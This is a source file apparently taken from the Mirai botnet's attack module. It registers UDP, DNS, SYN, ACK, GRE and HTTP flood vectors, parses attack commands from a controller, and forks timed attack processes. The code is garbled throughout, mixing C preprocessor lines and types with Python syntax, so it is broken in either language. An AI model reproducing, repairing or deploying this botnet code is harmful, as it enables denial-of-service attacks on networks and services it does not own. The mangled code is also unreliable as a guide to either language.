import os
_GNU_SOURCE	= #ifdef DEBUG
import sys
#endif
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"
#include "scanner.h"


methods_len = 0
struct attack_method **methods = NULL;attack_ongoing = (0)

BOOL attack_init(void)

    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic)
    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse)
    add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns)
	add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain)

    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn)
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack)
    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp)

    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip)
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth)

    #add_attack(ATK_VEC_PROXY, (ATTACK_FUNC)attack_app_proxy)
    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http)

    return True

def attack_kill_all():

#ifdef DEBUG
    printf("[attack] Killing all ongoing attacks\n")
#endif

    for i in range(ATTACK_CONCURRENT_MAX):
        if attack_ongoing[i] != 0:
            os.kill(attack_ongoing[i], 9)
        attack_ongoing[i] = 0

#ifdef MIRAI_TELNET
    scanner_init()
#endif

def attack_parse(buf, len):
    ATTACK_VECTOR vector
    struct attack_target *targs = NULL
    struct attack_option *opts = NULL

    # Read in attack duration uint32_t
    if len < sizeof (uint32_t):
        goto cleanup
    duration = ntohl(*(()buf))
    buf += sizeof (uint32_t)
    len -= sizeof (uint32_t)

    # Read in attack ID uint8_t
    if len == 0:
        goto cleanup
    vector = (ATTACK_VECTOR)*buf += 1
    len -= sizeof (uint8_t)

    # Read in target count uint8_t
    if len == 0:
        goto cleanup
    targs_len = (uint8_t)*buf += 1
    len -= sizeof (uint8_t)
    if targs_len == 0:
        goto cleanup

    # Read in all targs
    if len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len):
        goto cleanup
    targs = calloc(targs_len, sizeof (struct attack_target))
    for i in range(targs_len):
        targs[i].addr = *((ipv4_t *)buf)
        buf += sizeof (ipv4_t)
        targs[i].netmask = (uint8_t)*buf += 1
        len -= (sizeof (ipv4_t) + sizeof (uint8_t))

        targs[i].sock_addr.sin_family = AF_INET
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr

    # Read in flag count uint8_t
    if len < sizeof (uint8_t):
        goto cleanup
    opts_len = (uint8_t)*buf += 1
    len -= sizeof (uint8_t)

    # Read in all opts
    if opts_len > 0:
        opts = calloc(opts_len, sizeof (struct attack_option))
        for i in range(opts_len):

            # Read in key uint8
            if len < sizeof (uint8_t):
                goto cleanup
            opts[i].key = (uint8_t)*buf += 1
            len -= sizeof (uint8_t)

            # Read in data length uint8
            if len < sizeof (uint8_t):
                goto cleanup
            val_len = (uint8_t)*buf += 1
            len -= sizeof (uint8_t)

            if len < val_len:
                goto cleanup
            opts[i].val = calloc(val_len + 1, sizeof (char))
            util_memcpy(opts[i].val, buf, val_len)
            buf += val_len
            len -= val_len

    errno = 0
    attack_start(duration, vector, targs_len, targs, opts_len, opts)

    # Cleanup
    cleanup:
    if targs != NULL:
        free(targs)
    if opts != NULL:
        free_opts(opts, opts_len)

def attack_start(duration, ATTACK_VECTOR vector, targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):

    pid1 = os.fork()
    if pid1 == -1 or pid1 > 0:
        return

    pid2 = os.fork()
    if pid2 == -1:
        os.exit(0)
    elif pid2 == 0:
        sleep(duration)
        os.kill(os.getppid(), 9)
        os.exit(0)
    else:

        for i in range(methods_len):
            if methods[i].vector == vector:
#ifdef DEBUG
                printf("[attack] Starting attack...\n")
#endif
                methods[i].func(targs_len, targs, opts_len, opts)
                break

        #just bail if the function returns
        os.exit(0)

def attack_get_opt_str(opts_len, struct attack_option *opts, opt, def):

    for i in range(opts_len):
        if opts[i].key == opt:
            return opts[i].val

    return def

def attack_get_opt_int(opts_len, struct attack_option *opts, opt, def):
    val = attack_get_opt_str(opts_len; NULL)

    if val == NULL:
        return def
    else:
        return util_atoi(val, 10)

def attack_get_opt_ip(opts_len, struct attack_option *opts, opt, def):
    val = attack_get_opt_str(opts_len; NULL)

    if val == NULL:
        return def
    else:
        return inet_addr(val)

def add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func):
    struct attack_method *method = calloc(1, sizeof (struct attack_method))

    method.vector = vector
    method.func = func

    methods = realloc(methods, (methods_len + 1) * sizeof (struct attack_method *))
    methods[methods_len++] = method

def free_opts(struct attack_option *opts, len):

    if opts == NULL:
        return

    for i in range(len):
        if opts[i].val != NULL:
            free(opts[i].val)
    free(opts)
